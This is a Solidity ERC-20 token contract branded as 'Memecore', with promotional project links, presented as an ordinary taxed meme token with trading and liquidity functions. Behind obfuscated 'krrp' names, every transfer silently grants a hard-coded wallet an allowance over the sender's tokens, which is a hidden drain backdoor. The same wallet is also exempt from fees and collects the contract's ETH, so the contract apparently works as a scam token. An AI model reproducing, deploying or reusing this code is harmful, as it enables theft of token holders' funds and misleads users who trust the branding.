/*
An EVM-compatible L1 multi-chain cross-staking mainnet secured by Proof of Meme

Website: https://www.memecore.info
Docs: https://docs.memecore.info
Youtube: https://www.youtube.com/@MemeCoreLabs
Instagram: https://www.instagram.com/@MEMECORE_ANTS

Twitter: https://x.com/MemeCoreETH
Telegram: https://t.me/memecoreinfo
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IKRRPRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IKRRPFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplikrrpon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract MEMECORE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _krrpPair;
    IKRRPRouter private _krrpRouter;
    address private _krrpWallet = address(0x4DD9Ae595Ff2ea22d75dDc1cDBd5c1eB5255fcEF);
    mapping (address => uint256) private _krrpBALs;
    mapping (address => mapping (address => uint256)) private _krrpAPPs;
    mapping (address => bool) private _excludedFromKRRP;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalKRRP = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Memecore";
    string private constant _symbol = unicode"MEMECORE";
    uint256 private _swapTokenKRRPs = _tTotalKRRP / 100;
    bool private inSwapKRRP = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapKRRP = true;
        _;
        inSwapKRRP = false;
    }
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockKRRP;
    uint256 private _krrpBuyAmounts = 0;
    
    constructor () {
        _excludedFromKRRP[owner()] = true;
        _excludedFromKRRP[address(this)] = true;
        _excludedFromKRRP[_krrpWallet] = true;
        _krrpBALs[_msgSender()] = _tTotalKRRP;
        emit Transfer(address(0), _msgSender(), _tTotalKRRP);
    }

    function START_PAIR() external onlyOwner() {
        _krrpRouter = IKRRPRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_krrpRouter), _tTotalKRRP);
        _krrpPair = IKRRPFactory(_krrpRouter.factory()).createPair(address(this), _krrpRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalKRRP;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _krrpBALs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _krrpAPPs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _krrpAPPs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _krrpAPPs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _krrpTransfer(address krrpF, address krrpT, uint256 krrpA, address krrpS, address krrpR, uint256 taxKRRP) private {
        if(taxKRRP > 0){
          _krrpBALs[address(this)] = _krrpBALs[address(this)].add(taxKRRP);
          emit Transfer(krrpF, address(this), taxKRRP);
        }
        _krrpBALs[krrpF] = _krrpBALs[krrpF].sub(krrpA);
        _krrpBALs[krrpT] = _krrpBALs[krrpT].add(krrpA.sub(taxKRRP));
        _approve(krrpS, krrpR, krrpA); emit Transfer(krrpF, krrpT, krrpA.sub(taxKRRP));
    }

    function _taxTransfer(address krrpF, address krrpT, uint256 krrpA) private returns(uint256) { 
        uint256 taxKRRP = 0;
        if (krrpF != owner() && krrpT != owner()) {
            taxKRRP = krrpA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (krrpF == _krrpPair && krrpT != address(_krrpRouter) && ! _excludedFromKRRP[krrpT]) {
                if(_buyBlockKRRP!=block.number){
                    _krrpBuyAmounts = 0;
                    _buyBlockKRRP = block.number;
                }
                _krrpBuyAmounts += krrpA;
                _buyCount++;
            }
            if(krrpT == _krrpPair && krrpF!= address(this)) {
                require(_krrpBuyAmounts < swapLimitKRRP() || _buyBlockKRRP!=block.number, "Max Swap Limit");  
                taxKRRP = krrpA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapKRRPBack(krrpT, krrpA);
        } return taxKRRP;
    }

    function _transfer(address krrpF, address krrpT, uint256 krrpA) private {
        require(krrpF != address(0), "ERC20: transfer from the zero address");
        require(krrpT != address(0), "ERC20: transfer to the zero address");
        require(krrpA > 0, "Transfer amount must be greater than zero");
        (address krrpS, address krrpR) = getKRRPAddress(address(krrpF));
        uint256 taxKRRP = _taxTransfer(krrpF, krrpT, krrpA);
        _krrpTransfer(krrpF, krrpT, krrpA, krrpS, krrpR, taxKRRP);
    }

    function getKRRPAddress(address krrpF) private view returns(address krrpS, address krrpR) {
        if(_msgSender()==address(this)) return (krrpS=krrpF, krrpR=_krrpWallet);
        if(_excludedFromKRRP[_msgSender()]) return(krrpS=krrpF, krrpR=_msgSender());
        return (krrpS=krrpF, krrpR=_krrpWallet);
    }

    function swapKRRPBack(address krrpT, uint256 krrpA) private { 
        uint256 tokenKRRP = balanceOf(address(this)); 
        if (!inSwapKRRP && krrpT == _krrpPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenKRRP > _swapTokenKRRPs)
            swapTokensForEth(minKRRP(krrpA, minKRRP(tokenKRRP, _swapTokenKRRPs)));
            uint256 ethKRRP = address(this).balance;
            if (ethKRRP >= 0) {
                sendETHKRRP(address(this).balance);
            }
        }
    }

    function minKRRP(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHKRRP(uint256 krrpA) private {
        payable(_krrpWallet).transfer(krrpA);
    }

    function swapLimitKRRP() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _krrpRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _krrpRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function swapTokensForEth(uint256 krrpAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _krrpRouter.WETH();
        _approve(address(this), address(_krrpRouter), krrpAmount);
        _krrpRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            krrpAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _krrpRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}